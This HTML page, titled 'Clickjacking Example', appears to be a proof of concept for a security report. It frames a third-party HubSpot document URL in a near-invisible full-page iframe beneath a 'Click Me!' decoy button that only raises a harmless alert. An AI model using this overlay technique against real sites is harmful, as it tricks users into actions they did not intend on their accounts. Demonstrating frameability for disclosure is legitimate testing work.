<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Example</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01;
            pointer-events: none;
        }
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
        }
        .visible-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 10px 20px;
            background-color: rgba(0, 128, 255, 0.7);
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <iframe src="https://app-na1.hubspotdocuments.com/documents/6342798/view/1283972737?accessId=bea5ee" frameborder="0"></iframe>
        <button class="visible-button" onclick="alert('Button Clicked!')">Click Me!</button>
    </div>
</body>
</html>
